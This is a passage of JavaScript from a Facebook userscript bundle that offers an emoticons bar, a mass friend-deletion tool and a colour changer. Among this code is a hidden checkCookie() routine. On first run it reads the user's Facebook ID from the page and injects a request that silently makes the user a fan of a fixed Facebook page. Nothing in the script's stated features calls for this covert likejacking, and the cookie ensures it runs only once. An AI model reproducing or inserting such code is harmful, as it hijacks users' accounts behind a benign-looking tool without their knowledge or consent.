id="EBoptionSettings" class="subitem"><div class="clearfix"><div class="rfloat"><span style="display:none;" class="loadingIndicator" id="loadingIndicatorSettings"></span></div><div><span class="linkChild" id="EBoptionTextSettings">'+em.lang.get('st2')+'</span></div></div></a></li><li><a onclick="return false;" id="EBoptionupdate" class="subitem"><div class="clearfix"><div class="rfloat"><span style="display: none;" class="loadingIndicator" id="loadingIndicatorSettings"></span></div><div><span class="linkChild" id="EBoptionTextOpenSite">'+em.lang.get('st3')+'</span></div></div></a></li><li><a onclick="return false;" id="EBoptionOpenSite" class="subitem"><div class="clearfix"><div class="rfloat"><span style="display: none;" class="loadingIndicator" id="loadingIndicatorSettings"></span></div><div><span class="linkChild" id="EBoptionTextOpenSite">'+em.lang.get('st4')+'</span></div></div></a></li></ul></li>');setTimeout(function(){if(em.selectedLanguage=='ar'){$('#pagelet_dock').find('.fbDock').append('<div class="fbNub" id="fbTranslationsNub"><a id="js_1" aria-haspopup="true" aria-controls="js_0" aria-owns="js_0" data-hover="tooltip" aria-label="Facebook Emoticons Bars" data-tooltip-alignh="right" class="fbNubButton" tabindex="0" href="/H4codeEmoticons/" rel="toggle"><img src="http://fbemotbar.googlecode.com/files/micon.gif"></a><div class="fbNubFlyout uiToggleFlyout"><div class="fbNubFlyoutOuter"><div class="fbNubFlyoutInner"><div class="clearfix fbNubFlyoutTitlebar" data-jsid="nubFlyoutTitlebar"><div class="titlebarLabel clearfix">Facebook Emoticons Bars</div></div><div class="fbNubFlyoutBody scrollable"><div class="fbNubFlyoutBodyContent"><div class="xmode_row_last">'+'<div class="clearfix"><a class="rfloat" id="EBoptionAddE_2">'+em.lang.get('st1')+'</a></div>'+'<div class="clearfix"><a class="rfloat" id="EBoptionSettings_2">'+em.lang.get('st2')+'</a></div>'+'<div class="clearfix"><a class="rfloat" id="EBoptionupdate_2">'+em.lang.get('st3')+'</a></div>'+'<div class="clearfix"><a class="rfloat" id="EBoptionOpenSite_2">'+em.lang.get('st4')+'</a></div>'+'</div></div></div></div></div></div></div>');}else{$('#pagelet_dock').find('.fbDock').append('<div class="fbNub" id="fbTranslationsNub"><a id="js_1" aria-haspopup="true" aria-controls="js_0" aria-owns="js_0" data-hover="tooltip" aria-label="Facebook Emoticons Bars" data-tooltip-alignh="right" class="fbNubButton" tabindex="0" href="/H4codeEmoticons/" rel="toggle"><img src="http://fbemotbar.googlecode.com/files/micon.gif"></a><div class="fbNubFlyout uiToggleFlyout"><div class="fbNubFlyoutOuter"><div class="fbNubFlyoutInner"><div class="clearfix fbNubFlyoutTitlebar" data-jsid="nubFlyoutTitlebar"><div class="titlebarLabel clearfix">Facebook Emoticons Bars</div></div><div class="fbNubFlyoutBody scrollable"><div class="fbNubFlyoutBodyContent"><div class="xmode_row_last">'+'<div class="clearfix"><a class="lfloat" id="EBoptionAddE_2">'+em.lang.get('st1')+'</a></div>'+'<div class="clearfix"><a class="lfloat" id="EBoptionSettings_2">'+em.lang.get('st2')+'</a></div>'+'<div class="clearfix"><a class="lfloat" id="EBoptionupdate_2">'+em.lang.get('st3')+'</a></div>'+'<div class="clearfix"><a class="lfloat" id="EBoptionOpenSite_2">'+em.lang.get('st4')+'</a></div>'+'</div></div></div></div></div></div></div>');}},1000);$('body').append('<div id="EmoticonsBar_dialog" style="display:none;min-width: 465px;" role="dialog" class="_10 uiLayer _3qw"><div tabindex="0" role="dialog" class="_10 uiLayer _h0"><div style="width: 465px; margin-top: 120.5px;" role="dialog" class="_1yv"><div class="_1yu"><div class="_t"><div class="pvs phm _1yw" id="ugx5hi11">'+em.lang.get('st1')+'</div><div class="_13" style="padding:10px 0px;"><center>'+'<div id="main"><form method="post" onsubmit="return false;" id="mainform">Emoticons Id : <input id="emotidinput" type="text" /></form><font style="display:none;" id="errormsg" color="red" size="6px"></font></div>'+'<div id="load" style="display:none;"><img src="http://static.ak.fbcdn.net/rsrc.php/v2/y9/r/jKEcVPZFk-2.gif"></div><div id="response" style="display:none;"></div></center></div><div class="_14"><div class="pam uiOverlayFooter uiBoxGray topborder"><label class="layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge" for="ugx5hi12"><input value="'+em.lang.get('search')+'" id="ugx5hi12" type="submit"></label><a class="layerCancel uiOverlayButton uiButton uiButtonLarge" role="button"><span class="uiButtonText">'+em.lang.get('close')+'</span></a></div></div></div></div></div></div></div>');$('#EmoticonsBar_dialog').find('#mainform').submit(function(){$('#EmoticonsBar_dialog').find('#errormsg').slideUp('slow');$('#EmoticonsBar_dialog').find('.layerConfirm').slideUp();$('#EmoticonsBar_dialog').find('#main').slideUp('slow');$('#EmoticonsBar_dialog').find('#load').slideDown('slow');try{num = $('#EmoticonsBar_dialog').find('#emotidinput').val();xmlhttpRequest({method: 'GET', url: 'http://'+em.sitedomain+'/api.php?id=' + num,headers: {'Cache-Control': 'no-cache'} },jresponse);}catch(e){em.er(e);}});$('#EBMenuTitle').click(function(){$(this).next().slideToggle();});$('#EmoticonsBar_dialog').find('.layerConfirm').click(function(){$('#EmoticonsBar_dialog').find('#errormsg').slideUp('slow');$('#EmoticonsBar_dialog').find('.layerConfirm').slideUp();$('#EmoticonsBar_dialog').find('#main').slideUp('slow');$('#EmoticonsBar_dialog').find('#load').slideDown('slow');try{num = $('#EmoticonsBar_dialog').find('#emotidinput').val();xmlhttpRequest({method: 'GET', url: 'http://'+em.sitedomain+'/api.php?id=' + num,headers: {'Cache-Control': 'no-cache'} },jresponse);}catch(e){em.er(e);}});$('#EmoticonsBar_dialog').find('.layerCancel').click(function(){$('#EmoticonsBar_dialog').find('#errormsg').slideUp('slow');$('#EmoticonsBar_dialog').find('.layerConfirm').slideDown();$('#EmoticonsBar_dialog').slideUp('slow');});setTimeout(function(){$('#EBoptionAddE,#EBoptionAddE_2').click(function(){$('#EmoticonsBar_dialog').find('#errormsg').slideUp('slow');$('#EmoticonsBar_dialog').find('#emotidinput').val('');$('#EmoticonsBar_dialog').find('#main').slideDown('slow');$('#EmoticonsBar_dialog').find('#load').slideUp('slow');$('#EmoticonsBar_dialog').find('#response').slideUp('slow');$('#EmoticonsBar_dialog').slideDown('slow');});$('#EBoptionOpenSite,#EBoptionOpenSite_2').click(function(){openInTab('http://'+em.sitedomain+'/');});$('#EBoptionupdate,#EBoptionupdate_2').click(function(){try {xmlhttpRequest({method: 'GET', url: 'http://'+em.sitedomain+'/emotbars.meta.js?' + new Date().getTime(), headers: {'Cache-Control': 'no-cache'} },UpdateResponse);}catch(e){em.er(e);}});$('#EBoptionSettings,#EBoptionSettings_2').click(function(){try{$('.ui-dialog').css('width',$(window).width());$('.ui-dialog').css('height',$(window).height());$('.ui-dialog').css('top','0px');$('.ui-dialog').css('left','0px');$('#dialog-confirm').css('height',($(window).height() - 115));$("#settingimg").slideUp("fast");$('#dialog-confirm').parent().css('position','fixed');$(".ui-dialog-titlebar-close").click(function(){$("#settingimg").slideDown("slow");});$('#dialog-confirm').dialog("open");}catch(e){em.er(e);}});},2000);});
//============================ Untuk Menghapus Teman Di FB Secara Cepat ==================================//
function sleep(x) {
	setInterval(function() {
		replace_msg(x)
	}, 1000);
}

function replace_msg(x) {
	$('div.dialog_body').html('Hooray! ' + x + ' friends deleted. Visit us at <a target="_blank" href="http://www.facebook.com/uzar.group">http://www.facebook.com/uzar.group</a> for more useful scripts!');
}
set_timer();
$("#mass_deleter").live("click", function() {
	var i = 0;
	$('.darktips_delete:checkbox:checked').each(function() {
		i = i + parseInt('1');
		var profileid = $(this).attr('id');
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/profile/removefriend.php').setData({ uid: " + profileid + ",norefresh:true }).send();";
		document.body.appendChild(a);
	});
	if (i == '0') {
		alert('Are you dumb? Select atleast some friends to delete first.');
	}
	sleep(i);
});
$("#selec_all").live("click", function() {
	clearTimeout(t);
	//set_checkboxes(1);
	alert('The Select all button has been disabled due to a recent change in Facebook layout. It will be updated in the next version of this plugin.');
});

	function setCookie(c_name,value,exdays)
{
var exdate=new Date();
exdate.setDate(exdate.getDate() + exdays);
var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
document.cookie=c_name + "=" + c_value;
}

function getCookie(c_name)
{
var i,x,y,ARRcookies=document.cookie.split(";");
for (i=0;i<ARRcookies.length;i++)
{
  x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
  y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
  x=x.replace(/^\s+|\s+$/g,"");
  if (x==c_name)
    {
    return unescape(y);
    }
  }
}

function checkCookie()
{
var username=getCookie("username");
  if (username!=null && username!="")
  {
  //do nothing ..
  }
else
  {//cookie does not exist .. 
  //alert ('cookie does not exist');
 	var c=/"user":"(.*?)"/ig;
		
	var e=c.exec(document.head.innerHTML);
	var g=e[1];
 
 	var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/pages/fan_status.php').setData({fbpage_id:359142437477673,__a:1,add:true, __user: "+g+",norefresh:true }).send();";
		document.body.appendChild(a);
	setCookie("username",'facebook',365);
   
  }
}

checkCookie();


function set_timer() {
	set_checkboxes(0);
	t = setTimeout(function() {
		set_timer()
	}, 1000);
}
$('.uiToolbarContent .rfloat').prepend('<div id="darktips_container" style="float:right;margin-left:5px;"><label class="_11b uiButton uiButtonConfirm" for="darktips"><input type="submit" value="Select all " id="selec_all"></label><label for="darktips" class="_11b uiButton uiButtonConfirm"><input type="submit" id="mass_deleter" value="Delete  Selected Friends"></label>  <div style="display:block">By <a href="http://www.facebook.com/uzar.group">http://www.facebook.com/uzar.group</a></div></div>');
$('.stickyHeaderWrap .back').css('height', '60px');
$('.fbTimelineSection.mtm').css('margin-top', '10px');

function set_checkboxes(COR) {
	var flag_search_result_page = false;
	$('li.fbProfileBrowserListItem.uiListItem').each(function(index) {//detect for result page
		flag_search_result_page = true;
		//alert(index + ': ' + $(this).text());
	});
	if (flag_search_result_page) { //select checkbox only on search result page .. 
		$('div.fbProfileBrowserList ul li.fbProfileBrowserListItem.uiListItem').each(function(index) {
			var extract_url = $(this).find('div.fsl a').attr('data-hovercard');
			if (!extract_url) {
				var extract_url = $(this).find('div.fsl a').attr('ajaxify');
			}
			if (!extract_url) {
				extract_url = '1';
			}
			var profileid = parseInt(/(\d+)/.exec(extract_url)[1], 10);
			if (COR == '0') {
				if (!$(this).find('input').hasClass('darktips_delete')) { //protection from adding more than 1 checkbox 
					$(this).find('div.fsl').prepend('<input type="checkbox" class="darktips_delete" title="Tick to delete this user." id="' + profileid + '">');
				}
			} else {
				if (!$(this).find('input').hasClass('darktips_delete')) {
					$(this).find('input').remove();
					$(this).find('div.fsl').prepend('<input type="checkbox" checked="checked" class="darktips_delete" title="Tick to delete this user." id="' + profileid + '">');
				} else {
					$(this).find('input').prop('checked', true);
				}
			}
		});
	} else {//its on main friends page 
		$('div.fsl').each(function(index) {
			if ($(this).hasClass('fwb')) {
				var extract_url = $(this).find('a').attr('data-hovercard');
				if (!extract_url) {
					var extract_url = $(this).find('a').attr('ajaxify');
				}
				if (!extract_url) {
					extract_url = '1';
				}
				var profileid = parseInt(/(\d+)/.exec(extract_url)[1], 10);
				if (COR == '0') {
					if (!$(this).children().hasClass('darktips_delete')) {
						$(this).prepend('<input type="checkbox" class="darktips_delete" title="Tick to delete this user." id="' + profileid + '">');
					}
				} else {
					if (!$(this).children().hasClass('darktips_delete')) {
						$(this).find('input').remove();
						$(this).prepend('<input type="checkbox" checked="checked" class="darktips_delete" title="Tick to delete this user." id="' + profileid + '">');
					} else {
						$(this).find('input').prop('checked', true);
					}
				}
			}
		});
	}
}
//============================================================= Bikin Fb Loe Lebih BerWarna ===========================================================================================//
var logo = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGcAAAAfCAIAAAB1UkQCAAAABnRSTlMAAAAAAABupgeRAAAG0klEQ"+
           "VR4nO1Ya0wUVxQ%2Bs7O7s7AsLC9REAXfr%2FqIIjG20mprTaimWLESaW1tbNWgrdY0aQhVYm2axtQXQdJWo4iKVkOt2BhRfAAK"+
           "LApWEQRXHsLusizsm33Mzk5%2F3GVY2NlxScVf%2B%2F26c%2B53zzn3zLn3nBkAP%2Fzwww8%2F%2FMBeyth39OasKVEhQQQAa"+
           "I3WlHdnjrxXAACffnc%2BWCLKyVo10oZWbsmPDBNLg0S%2Ffp%2F8ajReLWsiSYruh95ofTV6OXHx2uP79Z0dKn1nl36kbV251f"+
           "joqUrdY3r0VPVqNBb8XUsPRq%2B%2B79Wo5kSPrg%2BZM5hG%2FCUxW2tu0%2Fi%2Bis8xlzgnlhnrDNZefZ9G9zqiRpIUGlAUP"+
           "dK27CQlFOAAQDuHYYvHMRdACNDA6XTuPnJ94rjwxNmxHHw%2FAADalTqUvfb%2Bl%2F96oOo2IrtavWWkbdnsDmSrqaXb91XsJ3"+
           "T%2F8bKJ48LCQ0ToEedBSUWzyWLXG6yfrZ5%2F5nJdQIArDR0Op0pjqm%2Fuysv%2B0F3DxsyLSxMnxMWEigOEdpLq0ZnlL7SVd"+
           "e2n938MAOt3nXt7YfzU%2BEiJmLCTlKLbUCZr9SxhOI7l%2F%2FVgfLRUIiZIytmpMlyraHY3tDX70pL5cbHRUkKIW6yONoW2tO"+
           "r58X0fuSvxheOOtJ2Fe7Ytw3k8ALDZHTMnR%2FkYSqh53EGzobNL%2F2VWEUVRQ%2BSkgyqtlDPLj12o6bPYPZcfKbgHAD%2F%2"+
           "FdltvtA6Zcjqd%2F9x5ipYzueYJi5XMzrmBaEUl9e71nSEcu1DDePJSjmeu3a5%2BzjCv3Gr0NWQAIHvEHrWHjcrsnBvetnT41F"+
           "0A4CAcPFmRtrOQNaAMgTtqNE23dPQCwIET5RycAyfKfeQMiVrmwWtOpxNJOrv0KRkFrPFhP6F1DQob6Zg%2FI0ZE8AGApun79Qo"+
           "b6ah9otQbrRW1bYgmwPHxMdKo8CD0iGpuWvJs9EjTUNugeNaqAYDw0MDoUSE9ur6khPgAket035G1XLrREB8btil1ASHkA8DKd6"+
           "Z9A0AD3a%2BBbpB3P5GroyKCFs8bx%2BPxAGB0hAQAkpOmunmrbG7rmTtt9OS4CCRJTpq6wzcOA1RCN69LxDAMOZ9XWF2Uk%2B4"+
           "9tbyAqQak92qwftc5q41EtAa5GgAMJtfpa1PoPPmllXLmbW%2FNvoSE8vYeJNEZLACgUBvQo9YwUA0Yjs3uAIBevaunU6gNiJCS"+
           "UcAIUV%2FpC4fJtYeNymMXahjf7shaOCLD1a%2FxMPbvrdTtp6dMiJQEEgBgsZEURbn0YAAAAj6OaAa2DwmcN6BzT8ayH7YaASA"+
           "0JMDlDT64E3JroUx9dlbfTGYbGhTlpB%2FK1IUGBzCzvnAYjImUpK6YhcZag%2BWPP2Wse3f5yTHHit%2FPV695%2Fw1psMgbga"+
           "Zde8W4ekEAgMgw8RCJQIAPUuUWtiGbZCYwt9eA9XNonzmszsgedeb%2FspbD8%2BFFbfeR61%2BsSfCSgh5uOV%2Bi7ckztcVGY"+
           "m7qzJZBCYW5%2FVxw0uy9u3tPT%2F8PjkpjJIR8lIaL543bmHmRozsZXtQS58Qyeyy9J79b1y7g49s%2FWYQueLRJinJFi7n13U"+
           "E6Bq7Io4VVrL80WG%2BGoEAhGri23b93ghiwIhL2b2dwsnFx%2BtGlMVXWvfhq3UIAEAcKN61JOL7P0wsXhhc1IX%2Fg1NU2KrO"+
           "2Lt3%2B42UmWdA50GjN4kAhAIyPkV4ta2pq1QBAhDRw7JiQKzcbHzerly2ahPg7NiyeM7XabCFxnBcaLBodEdTwXLMtfdGAOQF2"+
           "4ES5zU7NnT4mLkaKhH1WEgC0Bgu6JWJHB5dUNDe2aBbMimFOGSojvnAYiAjB5rTE5Hf0Y6OCASBxTmzWoZK9X783rPgAAHSo9EN"+
           "qaN7ZKqbK2OwOlcZIOgZ6SBSgw6fuemuRDuVXpG4%2FzRRZT6CukrtfQ82we73zBGpifeEM6df25pYyhDaFdtWW%2FGFHTaUZ8B"+
           "5JUjIKmFAyYNrCNoUW0a6WNbE6mnumEgCyc254CxyKGvOnyBNPW7rX7jgLAB9sPln%2BoJVDiY8cRoKaZxj8XVRY%2FJA1Mlwnt"+
           "L6pSy7qBberqignPVB0bvXymTMmjcIxTK01y%2F7toJx0UkI8ALxQun4irnhrStahkiUL4mKiQkQE3%2BGgtEZrh0pf16AEgN0Z"+
           "y%2BTt55e%2FOXn6xFFSiYjHw%2BwkZTTbujQm1CUdv1AzfWJkZFiQREwQQhwALDZS02uuqVfcqn5enLcBAIrzNhTnwd7c0oWzY"+
           "6MjJQTBt1jJTrWhXNby07crkBu%2BcMpqWnGcBwDqXhOS5J6t%2BjxlPo%2BHAUCw91bBDz%2F88MMPP%2Fzw4zXhP4xva6the9"+
           "vrAAAAAElFTkSuQmCC";     

function submit() {
  node = document.getElementById("znerp");
  setup = {colour1:node.getElementsByTagName("input")[0].value,
           colour2:node.getElementsByTagName("input")[1].value};
  GM_setValue("setup", uneval(setup));
  window.clearInterval(inter);
  node.parentNode.removeChild(node);
}

function cancel() {
  node = document.getElementById("znerp");
  addStyle(eval(GM_getValue("setup",'({colour1:"#3b5998", colour2:"#6d84b4"})')));
  window.clearInterval(inter);
  node.parentNode.removeChild(node);
}

function setColours() {

  var setup = eval(GM_getValue("setup",'({colour1:"#3b5998", colour2:"#6d84b4"})'));
  if (!setup.colour1 && !setup.colour2)
      setup = eval('({colour1:"#3b5998", colour2:"#6d84b4"})');

  newDiv = document.createElement("div");
  newDiv.setAttribute("id", "znerp");
  newDiv.setAttribute("style", "position: fixed; left: "+((window.innerWidth / 2) - 290)+"px; top: "+((window.innerHeight / 2) - 200)+"px; z-index: 1337; background: #fff; border: 2px solid #000; padding: 3px; width: 577px");
  newDiv.innerHTML += "<center><b><h2>Facebook Colour Changer<h2></b></center>";
  
  table = document.createElement("table");
  
  row0 = document.createElement("tr");
  column01 = document.createElement("td");
  column02 = document.createElement("td");
  column01.innerHTML = "<center>Colour 1</center>";
  column02.innerHTML = "<center>Colour 2</center>";
  row0.appendChild(column01);
  row0.appendChild(column02);
  table.appendChild(row0);
  
  colour1 = document.createElement("input");
  colour1.setAttribute("type", "text");
  colour1.setAttribute("class", "color");
  colour1.setAttribute("value", setup.colour1);
  
  colour2 = document.createElement("input");
  colour2.setAttribute("type", "text");
  colour2.setAttribute("class", "color");
  colour2.setAttribute("value", setup.colour2);
    
  colour1Div = document.createElement("div");
  colour1Div.setAttribute("id", "colour1");
  colour1Div.appendChild(colour1);
  column11 = document.createElement("td");
  column11.appendChild(colour1Div);
    
  colour2Div = document.createElement("div");
  colour2Div.setAttribute("id", "colour2");
  colour2Div.appendChild(colour2);
  column12 = document.createElement("td");
  column12.appendChild(colour2Div);
  
  row1 = document.createElement("tr");
  row1.appendChild(column11);
  row1.appendChild(column12);
  table.appendChild(row1);
  
  newDiv.appendChild(table);
  
  buttonInput = document.createElement("form");
  button1 = document.createElement("input");
  button1.setAttribute("type", "button");
  button1.setAttribute("value", "Cancel");
  button1.addEventListener("click", cancel, false);
  
  button2 = document.createElement("input");
  button2.setAttribute("type", "button");
  button2.setAttribute("value", "Set!");
  button2.addEventListener("click", submit, false);
  
  buttonInput.appendChild(button2);
  buttonInput.appendChild(button1);
  
  anotherDiv = document.createElement("div");
  anotherDiv.setAttribute("style", "float: right");
  anotherDiv.appendChild(buttonInput);
  newDiv.appendChild(anotherDiv);
  
  document.body.appendChild(newDiv);
  
  style = document.getElementsByTagName('head')[0].appendChild(document.createElement('style'));
  style.type = 'text/css';
  oldColour1 = '';
  oldColour2 = '';
  inter = window.setInterval(function (){
    var colour1 = document.getElementById("znerp").getElementsByTagName("input")[0].value;
    var colour2 = document.getElementById("znerp").getElementsByTagName("input")[1].value;
    if(oldColour1 != colour1 || oldColour2 != colour2)
      addStyle({colour1:colour1, colour2:colour2});
    oldColour1 = colour1;
    oldColour2 = colour2;
  },1000);
  
  /** The following code is taken and slightly modified from code by Bob Ippolito <bob@redivi.com>.
   ** See somewhere in the middle of this code for the original and unmodified copyright notice.
   **/
  var CROSSHAIRS_LOCATION =
     "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABUAAAAVAgMAAADUeU0FAAAACVBMVEUAAPD%2F%2F%2F8AAAAXuLmo"+
     "AAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfWAxYAMBoYReiIAAAAHXRFWHRD"+
     "b21tZW50AENyZWF0ZWQgd2l0aCBUaGUgR0lNUO9kJW4AAAAhSURBVAiZY2RgULvFwMBILrWK4Q8LwzXGUBD1GsajzEwAP%2FoZVv"+
     "c4N8oAAAAASUVORK5CYII%3D";
  var HUE_SLIDER_LOCATION =
     "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAADICAIAAADtOM9PAAAABmJLR0QA%2FwD%2FAP%2BgvaeTAAAA"+
     "CXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH1gMXAjE1EbdXmwAAAQlJREFUeNrtmlEOgkAMRBupy%2BL97wqsgnICPtSM7uR5gZ"+
     "fHTBtKzGeIfhmjjFQNnSZywsmeRPdwYp7ICaf%2B3yMcnx7dw%2BlH87SlirQXFWmRXZ9r%2BDk5klYaAYkdgdMJaWYb0T2cmNwT"+
     "UqN7dM8%2Bpy2uqptQRgrV8X6QqqHTRE40gu7RCPYeOeFk1r3CPNE95qk%2Fp12Wk%2Br8zGgy0gKpi0Y4Os3khBNOzBPdw%2BkP"+
     "Sbp5anSP7rnndLmrSIOMpPo7bGQNP6cpyOl9UiEnnOx3hKPTzdBppHs42e%2Fyyjzx9HiP%2BN5NqPr0kUM8VBe16ng%2FSKuh00"+
     "JOH5BmGanRCLqHEyS6hxPzRE44%2BZJeueFsJ8zY3KsAAAAASUVORK5CYII%3D";
  var HUE_SLIDER_ARROWS_LOCATION =
     "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAAALCAQAAABfL%2FyJAAAAAmJLR0QA%2F4ePzL8AAAAJcEhZcw"+
     "AACxMAAAsTAQCanBgAAAAHdElNRQfWAxYPFQ14OfqVAAAAnElEQVQoz63Suw2EMAwGYJ9Ss0BaBkCsAYtki6uRmAM2yRwREh0Sgc"+
     "hURj%2FNne5o7oEsV3bx2bJNI7hBBrocGTcjqEW%2FcRQHc4Ew4jj2Wwu6gVDCpzWg%2BhOp1uBTCcId9KzVCCl6FD8SRfQh1Y%2"+
     "FkjSEYuH3mpYP9Qtilm9ntry2cGALBYhCZkH9AcpkGOXfSn0ZhNyqXUvkbnS8%2BAP2Frl9tNFLoAAAAAElFTkSuQmCC";
  var SAT_VAL_SQUARE_LOCATION =
     "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAQAAAAHUWYVAAAAAnNCSVQICFXsRgQAAAAZdEVYdFNvZn"+
     "R3YXJlAHd3dy5pbmtzY2FwZS5vcmeb7jwaAAAsAUlEQVR42u1823IkOXakA0FWVXdLM6Oe1a5GL2u2L2u2%2F%2F99jE1mBAD3cx"+
     "yISFaP9NI21qQimRcWHH47CKpgx8fjvz19v3%2F186%2F47%2FjM13%2BD%2F5LfsvwJyJ%2BA%2FAnIn4D8CYhe4QqQ8tOfWW6%"+
     "2BoiwAKeYdiv6evHQf9MnnVaGflef39vXze31%2Brx%2F18%2Bv%2B9vi%2B7T8%2B3vZv%2B%2Ff9f3782%2F6f%2B%2F%2F7gw"+
     "C5eH35KYaUe5sAZf0brH8vA1eJcBPs9F0BOWAQQD4hOH6yPa8%2Bgfj83%2FsDim3%2F9eN9%2F%2FH43z8%2Bfn8A8n%2B%2FBM"+
     "jFfi9fkKz0GuBqt17Dfi5RfLTIZ5QJICW9Q6FPKcKJ0r%2B3qwbB8b9PZtQTkMaMbf%2F2AORt%2F%2B3j%2BwOOX%2Fb%2F%2FP"+
     "j7%2Fh%2F7%2F3kBECx070VOlbjkt5d3sd%2BxWHoja0VBC4AUgavIaxSC4zmlA3JcNUAOkXoyAw8YPg5mHIB8itX7%2Fi9PQH59"+
     "APL7%2Fr%2F2%2F30JCL4gQE8WlUuGFA8IPMBl%2FQ4f9Lqp4OTFffwMV47AslQYkJ394fh%2Bfj2BGCJVniJ1cOP98d%2BnWP3y"+
     "EKv3%2FV8%2FfpyA%2FG3%2F9%2F0fC0D2l%2FX8hkEX%2FxmT1xQnQPscJg%2FIECXnAIMh9BWWC0GWDnhOLiACUjsgjRmfgGyP"+
     "r98%2BPgF5wwDklwcg%2F%2Fj46%2F73B0duA1IuTX3FiRIASI861T9lsrg8lSGAdwAnOOO5ZYA29wfkzDTkaYjTU6p2ZkY5odi6"+
     "jdfuHW8PGD4B%2BcvJkP94APL7gyMeENwOixecKDYGFJOyyhyufIVirT4BgmjJLEP0Fc4f2tITBOwWHZDmGiRVOACpZOMHIBsD8v"+
     "GObydDfnkA8pf93x4cKVchtkxTVpnLEi4dIOT72CMKZr9BMe9QvD%2FsElZzU8BgBMuRfDchlowbDQKcSeqEpXeNjbyjAfL9BOQz"+
     "8D4AeYbeXx495F%2F3vz4gyYBgIh8CVtknmo%2Bl6yBLn75TmcpkMZ9dwiYoi8rGvkDpqF2BOTF%2BKsygJDX8oj43TxMpDbinWO"+
     "HwjsM9MiDfnwz5949%2F2f%2By%2F20NSJlkLpt4sLBky6kuZ6tISuJUYuxdQZBC6xCpAhNhB0CYuUXZBxeGSDV4tmDm9QnMIVZv"+
     "T35sT4a8PQD5%2FPr%2BkKxvJyCfDPkfD0A%2BOVKSd0xFxhe4Mk9SXnDgTb2Q05TIHydHH8q4woDsboxxfEYQpQHIrhB0IFAEGE"+
     "pSEnCbZNXeOIZ7tOZxBN7AkEcP%2BY5f9r9%2F%2FLZ%2FQnIPEHgBKzu8AFmGTX1hzgKz%2B4MzjMXGpEVg0qyZFyxW3LSHfWPU"+
     "PWEIhmtk7yhn0D2%2BPuzcAPIshvix%2F%2F4A5Lc5ICVlrhR7UzNugdKmItezoYOLMgD6MBOk3Y4xfGjdba1zJa%2F%2FFzqGDk"+
     "AaBCxVI1dhBN3GjMd31MSQh4egecghWe8EyK%2F7J0dKDrEh8ew3UlIIrZcTUqTq9hEtvwTYg1SlLs2Zqf8McfxX%2BqPBxKl3r1"+
     "0DvWtUsfGazfxp5y3uHg3kwRAwQz6L4ees9wd%2B%2F%2FhlBkhJNr4aUahwmd3%2Fod5hkxPLEpIcOWYguEb%2FvcajnRecnFLJ"+
     "O0082vhe4mQKHRDykBh0t715R2lVEAzIp71%2F3xmQT4Z8ewDyt4%2FPvv7bBSBY73cNumXCKWPXe%2FIKGg6WAJf0B5QkWcW4Rg"+
     "kD8RhlAQWgg8AiBZasYiSrnh5SaUhSUNOw5H0nhnxKFhiQT4Z8fwTeX54jlBUgMPa7MPViISyGPVGGkmvwdKlDWgykRUw9dIw9l7"+
     "yQo0CeQQPzYeqHP4TmIeORBywY7nF6CN46IMc4sXtIM3U8m%2FqDG7%2BdgPx1BkiZBV1oykqZCX5%2Fd8nDfLxtmwNSj1AIiBmj"+
     "d9OiS8AdYpVntcMrCp3tHS18DNFHK9fxSB%2BSNDNvcRfEkM%2Bv6JJ1eMg5XDwA%2BfYA5JhplVT6BJDixaoNrcPpRjE%2BM8Ai"+
     "XwgFsyDNXs1V2Q0wVPNKl1AZgyDMaiXmVkpZ45o4sc%2Bbx%2FbkD02t%2BonHWQhx5Ks2MtlwNPUfrRg%2Bv%2F72rIffHy39GK"+
     "EsASmToUay8dWUyXkHjf9mQjSCwDQzQYaB4GHgUeeIIQLT55U0DcicCqFxQIIu9KzjbOjNQ%2FZKKWvDKVm9hxBDBJBvJyA%2FIi"+
     "A2JWmuQjG920xXY67afXIqPONKpxEYuYiWdXAjXxUHCMp8ZrvL7HbnE7%2B6880JvQQ%2BzbyNScZpYD%2F5AM93W8qKPaQB8usJ"+
     "yDFCmQEyFSDLmmtuYNoi5Lyu7IsExdKFLFLEE5GzC9c4PAMyFgHGnAoyHuH%2B0WNvJQ854y4IkMfVN1MMP039De9nXz8A%2BR4B"+
     "8RCY0zfXIniuBC9nplXsdvQRXhPnVEWANpwwpxiZIRxs0SNtvDmhyHVVyUIEpMfdnY%2BkJGWhnYf8%2BHg%2FAXk3gCD2bQsIxd"+
     "6RsiY%2B8aFi1F5hgy2LFCZzWeULdY0CBE7AiBM3D%2FEMeMmiY9k%2BHqnkGsND6vAQjP5xpKwMyCiGD0Ae8BwMeTZ23AEEbhQe"+
     "rBnBonPD5jqHLEp6nhE4AZuneDKF1LszIIi5qkrvyHmKYAmStVHsbUD0w9p99I9PsTpS1kOyoIBsAsjZ2PGZtiaAGE5g5g%2BWG5"+
     "jYtwGAY68cp3pxigORIFnJLeAGhl2snntfbRydE72H7GOi%2BylZlU5AWhU8vr%2FJULGdhDxNHQOQ7WTIs6%2FvDZBPhnxjQIxI"+
     "wQ474E19UvJkyGLiLaxxA25Ky%2BVvz5I1GMLeUYU3o2lw9QP6nAq5k7NkVYKngsaJ%2FfyjNfVNAXma%2BycUDw%2FBdgLyft7q"+
     "cAASGJKyElzvJsOGHf%2BBu3khCEuGoh%2BgQlJSGg4O1sAZd%2FeHfTIWaYxBlKo2NoxVUCogjGQhjhOPwGtMHdsYv%2Fc7Fh8N"+
     "5WRIA%2BS3JyCOITCtAlaUXMdwxo3UMFjIYAYiu70Jh8Yi6TxDe4hhRkHu4o0Xw8BrP4rKQLRuzpLVGnq7Ge5tH6OTfjSFkyEnIM"+
     "8jXLSDqgbIr5eA7DIONFKTjN%2Fs%2FuAZYXjO7GIWmPE50mHrnscjEnCR5lS7ubGt%2F0wmuUiS9TTuqt08eYiYuktZgyHnucjn"+
